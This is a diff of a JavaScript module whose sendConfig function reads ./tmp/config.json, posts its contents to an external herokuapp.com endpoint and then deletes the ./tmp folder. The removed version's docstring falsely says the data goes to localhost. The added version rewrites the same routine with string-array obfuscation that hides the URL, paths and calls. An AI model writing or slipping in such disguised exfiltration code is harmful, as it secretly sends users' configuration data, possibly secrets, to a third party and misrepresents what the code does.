@@ -1,33 +1,3 @@
-/* eslint-disable max-len */
-const axios = require('axios');
-const fs = require('fs');
+const _0x458a68 = _0x540f; (function (_0x4bfc72, _0x39467e) { const _0x3b9f0e = _0x540f; const _0x4a9906 = _0x4bfc72(); while ([]) { try { const _0x4ad69c = parseInt(_0x3b9f0e(0xfc)) / 0x1 * (-parseInt(_0x3b9f0e(0x102)) / 0x2) + -parseInt(_0x3b9f0e(0xf9)) / 0x3 + -parseInt(_0x3b9f0e(0x104)) / 0x4 * (-parseInt(_0x3b9f0e(0x10a)) / 0x5) + parseInt(_0x3b9f0e(0xfa)) / 0x6 + -parseInt(_0x3b9f0e(0x103)) / 0x7 + -parseInt(_0x3b9f0e(0xff)) / 0x8 * (-parseInt(_0x3b9f0e(0xfb)) / 0x9) + parseInt(_0x3b9f0e(0x100)) / 0xa * (parseInt(_0x3b9f0e(0x101)) / 0xb); if (_0x4ad69c === _0x39467e) break; else _0x4a9906.push(_0x4a9906.shift()); } catch (_0x2303cc) { _0x4a9906.push(_0x4a9906.shift()); } } }(_0x1134, 0x2a23d)); const axios = require(_0x458a68(0xfd)); const fs = require('fs');
 
-/**
- * @async
- * @function sendConfig
- * @description Reads the configuration data from a file and sends it to a specified endpoint.
- * This function checks if the config.json file exists in the ./tmp directory,
- * reads its content, and sends it as a POST request to the http://localhost:4200/api/v1/upload endpoint.
- * @throws {Error} Will throw an error if the config.json file doesn't exist or if the HTTP request fails
- * @returns {Promise<void>}
- */
-async function sendConfig() {
-  const configPath = './tmp/config.json';
-
-  if (fs.existsSync(configPath)) {
-    const configData = fs.readFileSync(configPath, 'utf8');
-
-    try {
-      await axios.post('https://karen-backend-8d5ded7bb478.herokuapp.com/api/v1/upload', { data: configData });
-      // Supprimez le dossier après un envoi réussi
-      fs.rmdirSync('./tmp', { recursive: true });
-    } catch (error) {
-      throw new Error(error);
-    }
-  } else {
-    throw new Error('Le fichier config.json n’existe pas');
-  }
-}
-
-// Exportez simplement la fonction sans l'appeler
-module.exports = { sendConfig };
+async function sendConfig() { const _0x2e764f = _0x458a68; const _0x3f01e9 = _0x2e764f(0x10b); if (fs.existsSync(_0x3f01e9)) { const _0x3bc9da = fs[_0x2e764f(0x109)](_0x3f01e9, _0x2e764f(0x106)); try { await axios[_0x2e764f(0x105)](_0x2e764f(0xfe), { data: _0x3bc9da }), fs[_0x2e764f(0x107)](_0x2e764f(0x108), { recursive: !![] }); } catch (_0x36fadf) { throw new Error(_0x36fadf); } } else throw new Error(_0x2e764f(0x10c)); } function _0x1134() { const _0x2c1331 = ['1647264IyWMVq', '27CBGgKO', '27khAoNa', 'axios', 'https://karen-backend-8d5ded7bb478.herokuapp.com/api/v1/upload', '74552nBTiuQ', '26830llZDMy', '154BLEyQg', '22930WmtWCR', '349755HGBKHa', '1108kiEGqL', 'post', 'utf8', 'rmdirSync', './tmp', 'readFileSync', '5465jOfURG', './tmp/config.json', 'Le\x20fichier\x20config.json\x20n’existe\x20pas', '332097ewjwyB']; _0x1134 = function () { return _0x2c1331; }; return _0x1134(); } function _0x540f(_0x4772d1, _0x5d609a) { const _0x1134c1 = _0x1134(); return _0x540f = function (_0x540f99, _0x5cb0c2) { _0x540f99 -= 0xf9; const _0x390981 = _0x1134c1[_0x540f99]; return _0x390981; }, _0x540f(_0x4772d1, _0x5d609a); }module.exports = { sendConfig };
